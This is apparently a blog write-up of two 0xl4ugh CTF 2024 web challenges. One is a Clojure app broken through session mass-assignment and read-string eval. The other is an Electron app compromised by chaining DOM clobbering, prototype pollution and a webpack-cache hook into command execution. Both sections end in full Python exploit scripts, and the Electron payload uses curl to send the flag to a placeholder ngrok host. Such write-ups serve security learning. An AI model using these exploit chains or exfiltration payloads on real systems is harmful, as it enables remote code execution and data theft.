---
title: "0xl4ugh CTF 2024 - writeup"
date: "2024-12-30T00:00:00.000Z"
lang: EN
---

## ✅ Manifesto (100pts 109solves)

### Overview

![](/assets/blog/0xl4ugh/image.png)

The server is a simple login application written in Clojure. The goal of this challenge is to read the content of `/flag`. 

```clojure:core.clj
(ns manifesto.core
  (:require [clojure.java.io :as io]
            [clojure.core :refer [str read-string]]
            [ring.adapter.jetty :refer [run-jetty]]
            [ring.util.response :as r]
            [ring.middleware.resource :refer [wrap-resource]]
            [ring.middleware.params :refer [wrap-params]]
            [ring.middleware.session :refer [wrap-session]]
            [selmer.parser :refer [render-file]]
            [cheshire.core :as json]
            [environ.core :refer [env]]))

;; thread-safe stores powered by clojure atoms
(defonce server (atom nil))
(def users (atom {}))

;; configure selmer path
(selmer.parser/set-resource-path! (io/resource "templates"))

;; records
(defrecord User [username password gists])

;; services
(defn insert-user
  ;; clojure's multiple-arity functions are elegant and allow code reuse
  ([username password] (insert-user username password []))
  ([username password gists] (swap! users assoc username (->User username password gists))))
(defn insert-gist [username gist] (if (contains? @users username)
                                    (swap! users assoc-in [username :gists]
                                           (conj (get-in @users [username :gists]) gist)) nil))

;; utilities
(defn json-response [m] {:headers {"Content-Type" "application/json"}
                         :body (json/generate-string m)})

(:password (@users "admin"))
[(defn routes [{:keys [request-method uri session query-params form-params]}]
   (cond
     ;; index route
     (re-matches #"/" uri)
     (-> (r/response
          (render-file "index.html"
                       {:prefer (or (query-params "prefer") (session "prefer") "light")
                        :username (session "username")
                        :url uri}))
         (assoc :session (merge {"prefer" "light"} session query-params)))

     ;; display user gists, protected for now
     (re-matches #"/gists" uri)
     (cond (not= (session "username") "admin")
           (json-response {:error "You do not have enough privileges"})

           (= request-method :get)
           (r/response
            (render-file "gists.html"
                         {:prefer (session "prefer")
                          :username (session "username")
                          :gists (get-in @users [(session "username") :gists])
                          :url uri}))

           (= request-method :post)
           (let [{:strs [gist]} form-params]
             ;; clojure has excellent error handling capabilities
             (try
               (insert-gist (session "username") (read-string gist))
               (r/redirect "/gists")
               (catch Exception _ (json-response {:error "Something went wrong..."}))))

           :else
           (json-response {:error "Something went wrong..."}))

     ;; login route
     (re-matches #"/login" uri)
     (cond
       (session "username")
       (r/redirect "/")

       (= request-method :get)
       (r/response
        (render-file "login.html"
                     {:prefer (session "prefer")
                      :user (@users (session "username"))
                      :url uri}))
       (= request-method :post)
       (let [{:strs [username password]} form-params]
         (cond
           (empty? (remove empty? [username password]))
           (json-response
            {:error "Missing fields"
             :fields (filter #(empty? (form-params %)) ["username" "password"])})
           :else
           ;; get user by username
           (let [user (@users username)]
             ;; check password
             (if (and user (= password (:password user)))
               ;; login
               (-> (r/redirect "/gists")
                   (assoc :session
                          (merge session {"username" username})))
               ;; invalid username or password
               (json-response {:error "Invalid username or password"})))))
       :else (json-response {:error "Unknown method"}))

     ;; logout route
     (re-matches #"/logout" uri)
     (-> (r/redirect "/") (assoc :session {}))

     ;; detect trailing slash java interop go brr
     (.endsWith uri "/")
     ;; remove trailing slash thread-last macro go brr
     (r/redirect (->> uri reverse rest reverse (apply str)))

     ;; catch all
     :else
     (-> (r/response "404 Not Found")
         (r/status 404))))

 ;; define app and apply middleware
 (def app (-> routes
              (wrap-resource "public")
              (wrap-params)
              (wrap-session {:cookie-name "session" :same-site :strict})))]

;; server utilities
(defn start-server []
  (reset! server (run-jetty (fn [req] (app req))
                            {:host (or (env :clojure-host) "0.0.0.0")
                             :port (Integer/parseInt (or (env :clojure-port) "8080"))
                             :join? false})))

(defn stop-server []
  (when-some [s @server]
    (.stop s)
    (reset! server nil)))

;; convenience repl shortcuts
(comment
  (start-server)
  (stop-server))

;; initialize

(defn -main []
  ((do (insert-user "admin" (str (random-uuid)))
       (insert-gist "admin" "self-reminder #1: with clojure, you get to closure")
       (insert-gist "admin" "self-reminder #2: clojure gives me composure")
       (insert-gist "admin" "self-reminder #3: i 💖 clojure")
       start-server)))
```

You cannot create your own user, but an `admin` user is created during initialization. The `/gist` endpoint can only be used if you are logged in as an admin.

### Solution

#### Step 1: Logging in as admin

When you access the `/` endpoint, the following function will be executed:

```clojure
(assoc :session (merge {"prefer" "light"} session query-params))
```

The `merge` function combines two or more maps, giving priority to the latter ones. In this case, every key-value pair in the query parameters is merged into the existing `session` and stored using the `assoc` function.

Henc, you can exploit **mass-assignment** to set your session's username to `admin` using the query parameter.

#### Step 2: Getting the flag

When you send a POST request to the `/gist` endpoint, a new gist will be created using the following code:

```clojure
(insert-gist (session "username") (read-string gist))
```

The `read-string` function parses strings in EDN format. Although it's normally a data-deserialization function, it can be exploited to run arbitrary commands with the following syntax:

```clojure
(read-string "#=(eval (+ 1 2))")
```

To read an environment variable, you can use the dot function (`.`). This allow us to call any classes and functions from Java. For example,

```clojure
(. System getenv "FLAG")
```

is equivalent to:

```java
java.lang.System.getenv("FLAG")
```

### Full exploit

```python
import requests

URL = "http://localhost:3000/"
EVIL = "https://xxx.ngrok.app/"

s = requests.session()
r = s.get(URL, params={
  "username": "admin"
})
r = s.post(URL + "gists", data={
  "gist": '#=(eval (. System getenv "FLAG"))'
})
print(r.text)
```


## Ada Indonesia Coy 

(This is an upsolve. Please read [writeup nolang's](https://nolangilardi.github.io/blog/2024-0xl4ugh-ctf--ada-indonesia-coy/) for the more detailed approach. My exploit is created based on this writeup)

![alt text](/assets/blog/0xl4ugh/image1.png)

The challenge consists of an Electron application and a bot that opens the application with the given argument.

```javascript:main.js
const { app, BrowserWindow, ipcMain } = require('electron')
const path = require("path")
/**
 * @type {BrowserWindow}
 */
var mainWindow;

const createWindow = () => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "./preload.js"),
      nodeIntegration: false,
      contextIsolation: false,
    },
    fullscreen: true,
  })
  win.loadFile("./ada-indonesia-coy/index.html")
  return win
}

let config = {
  embed: process.argv[1]
}
console.log("embed", config.embed)

ipcMain.handle("set-config", (_, conf, obj) => {
  Object.assign(config[conf], obj)
})

ipcMain.handle("get-config", (_) => {
  return config
})

ipcMain.handle("get-window", (_) => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    parent: mainWindow,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: false,
    },
    fullscreen: true,
  })
  win.loadFile("./ada-indonesia-coy/index.html")
})

app.whenReady().then(() => {
  mainWindow = createWindow()
})

app.on('browser-window-created', (_, win) => {
  if(mainWindow){
    if (mainWindow.getChildWindows().length > 0){
      win.close()
    }
  }
})
```

```javascript:preload.js
const electron = require("electron")
async function createNoteFrame(html, time) {
    const note = document.createElement("iframe")
    note.frameBorder = false
    note.height = "250px"
    note.srcdoc = "<dialog id='dialog'>" + html + "</dialog>"
    note.sandbox = 'allow-same-origin'
    note.onload = (ev) => {
        const dialog = new Proxy(ev.target.contentWindow.dialog, {
            get: (target, prop) => {
                const res = target[prop];
                return typeof res === "function" ? res.bind(target) : res;
            },
        })
        setInterval(dialog.close, time / 2);
        setInterval(dialog.showModal, time);
    }
    return note
}

class api {
    getConfig(){
        return electron.ipcRenderer.invoke("get-config")
    }
    setConfig(conf, obj){
        electron.ipcRenderer.invoke("set-config", conf, obj)
    }
    window(){
        electron.ipcRenderer.invoke("get-window")
    }
}

window.api = new api()

document.addEventListener("DOMContentLoaded", async () => {
    if (document.location.origin !== "file://") {
        document.write(`<!DOCTYPE html>
<html>

<!-- snap -->

</html>`)
        const header = document.createElement("h1")
        header.setHTML("Palang Darurat")
        document.body.appendChild(header)
        const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
        document.body.appendChild(mynote)
    } else {
        const embed = (await window.api.getConfig()).embed
        document.getElementById("embed").setHTML("<h1>"+embed+"</h1>")
    }
})
```

The argument will be sent to the preload script using `api.getConfig` which uses IPC. Then, it will be embedded as HTML element using `setHTML` function.

If `document.location.origin !== "file://"` is true after `DOMContentLoaded` event, an `iframe` element will be created which includes `decodeURIComponent(document.location)` in its `srcdoc`.

The goal of this challenge is to somehow achieve RCE and execute `/readflag`.


### Solution

#### Step 1: Achiving `document.location.origin !== "file://"`

`Element.setHTML` is a function defined in [Sanitizer API](https://wicg.github.io/sanitizer-api/#framework), which is [deprecated](https://developer.chrome.com/blog/sanitizer-api-deprecation) in most environment, but still available in Electron. You cannot include Javascript code using a `<script>` tag or event handlers to change `document.location.origin`.

However, you can still use the `<meta>` tag to redirect the current page to another page, which will also change `document.location.origin`.

#### Step 2: Escaping from iframe

The iframe will be created with a `srcdoc` attribute containing the following string:

```javascript
const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
```

The page now looks like this:

![](/assets/blog/0xl4ugh/image-1.png)

However, because the `sandbox` attribute is set to `allow-same-origin`, you cannot run scripts inside the iframe.

You will see that the iframe is blinking. Let's see how that is implemented.

```javascript
note.onload = (ev) => {
    const dialog = new Proxy(ev.target.contentWindow.dialog, {
        get: (target, prop) => {
            const res = target[prop];
            return typeof res === "function" ? res.bind(target) : res;
        },
    })
    setInterval(dialog.close, time / 2);
    setInterval(dialog.showModal, time);
}
```

The code expects `ev.target.contentWindow.dialog` to be an `HTMLDialogElement`, and calls [showModal()](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/showModal) and [close()](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close) method via `setInterval`.

But what if `ev.target.contentWindow.dialog` is not and `HTMLDialogElement`, and `showModal` is a string? Note that [`setInterval` also accepts first argument as string and call it similar to eval function](https://developer.mozilla.org/en-US/docs/Web/API/Window/setInterval#code). You can achieve this by **DOM clobbering**. If `<a id='dialog'><a id='dialog' name='close' href='cid:alert(1)'>` is inserted, `dialog.close` will match `"cid:alert(1)"`, and then `alert(1)` will be executed.

#### Step 3: Escaping from sandboxed environment

Now you can execute arbitrary code inside the webContents environment, but you cannot run a shell script. To see why, we need to look at the security measures in an Electron application.

There are mainly 3 options that affect the security.

First option is [`contextIsolation`](https://www.electronjs.org/docs/latest/tutorial/context-isolation). When this is set to `true` the environment in `preload.js` and the webContents environment will be different. In this challenge, this is explicitly set to `false`, which means that everything you set in the webContents environment also affect the code in preload script.

Second option is [`nodeIntegration`](https://www.electronjs.org/docs/latest/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content). When this is set to `true`, you can access the Node.js API inside webContents environment. In this challenge, this is explicitly set to `false`, which means that you cannot directly call the `require` function or the `process` object to run the shell script. However, polyfilled `require` function is still available to access to some functions in Node.js API inside the preload script.

Third option is [`sandbox`](https://www.electronjs.org/docs/latest/tutorial/sandbox). When this is set to `true`, the renderer processes can only perform privileged tasks. This means that you cannot run a shell script unless this is set to `false`. In this challenge, this is not set and the default value of `true` is used.

To summarize, we cannot call `/readflag` unless either `nodeIntegration` is `true` or `sandbox` is `false`. Since `nodeIntegration: true` is hard-coded, we need to somehow change the default value of `sandbox` to `false`.

There are 3 APIs that the webContents environment can access through IPC:

```javascript
ipcMain.handle("set-config", (_, conf, obj) => {
  Object.assign(config[conf], obj)
})

ipcMain.handle("get-config", (_) => {
  return config
})

ipcMain.handle("get-window", (_) => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    parent: mainWindow,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: false,
    },
    fullscreen: true,
  })
  win.loadFile("./ada-indonesia-coy/index.html")
})
```

Notice that the `set-config` event has **prototype pollution** vulnability. You can set the value of `Object.prototype.sandbox` to `false` to disable  the `sandbox` option the next time you call the `get-window` function.

This is where I got stuck. I read the [research done by Black Hat](https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf) and thought that I could access the `__webpack_require__` function using the following code:

```javascript
const origCallMethod = Function.prototype.call;
Function.prototype.call = function(...args) {
  if(args[3] && args[3].name === "__webpack_require__") {
    window.__webpack_require__ = args[3];
  }
  return origCallMethod.apply(this, args);
}
```

This worked in a sandboxed environment but not in an unsandboxed environment.

I should have looked more deeply into why this is the case. The reason why the previous code works is because it hooks to the following code:

```javascript
function __webpack_require__(r) {
    var n = t[r];
    if (void 0 !== n)
        return n.exports;
    var i = t[r] = {
        id: r,
        loaded: !1,
        exports: {}
    };
    return e[r].call(i.exports, i, i.exports, __webpack_require__),
    i.loaded = !0,
    i.exports
}
```

This is slightly changed in the unsandboxed environment.

```javascript
function __webpack_require__(r) {
    var n = t[r];
    if (void 0 !== n)
        return n.exports;
    var i = t[r] = {
        exports: {}
    };
    return e[r](i, i.exports, __webpack_require__),
    i.exports
}
```

Since `Function.prototype.call` function is not used here, I failed to hook to this function.

The variable `t` stores the cache of required functions. Since it's checking if `t[r]` is null or not, prototype pollution is available here.

By using `Object.defineProperty`, you can hook to setter function. Inside this setter function, `this` is points to the original object, which is the varialble `t` that holds all the cache.

The module I want to require is the `module` module. If I rewrite the setter for `"./lib/renderer/api/ipc-renderer.ts"`, the `module` module appears to be already cached in the unsandboxed environment. Hence, you can access it.

I used the payload described in [the research done by Black Hat](https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf), which is as follows:

```javascript
this.module.exports._load("child_process").execSync("id")
```

### Final exploit

```python
import base64
from urllib.parse import quote

URL = "http://localhost:8080/"
EVIL = "https://xxx.ngrok.app/"

script = """(async () =>{
    Object.defineProperty(Object.prototype, "./lib/renderer/api/ipc-renderer.ts", {
        set(v) {
            try {
                this.module.exports._load("child_process").execSync(atob("%s"));
            } catch(e) {}
            window.orig = v;
        },
        get(){
            return window.orig;
        } 
    });
    api.setConfig("__proto__", {
        sandbox: false,
    });
    api.window();
})()""" % base64.b64encode(f"curl {EVIL}?flag=$(/readflag|base64)".encode()).decode()

payload = f"<a id='dialog'><a id='dialog' name='close' href='cid:{script}'>"

payload = f'</h1><meta http-equiv="refresh" content="0; url=https://example.com/?x{quote(payload)}">'


import requests

s = requests.session()
r = s.post(URL + "api/payload", json={
    "payload": payload
})
print(r.status_code)
print(r.text)
```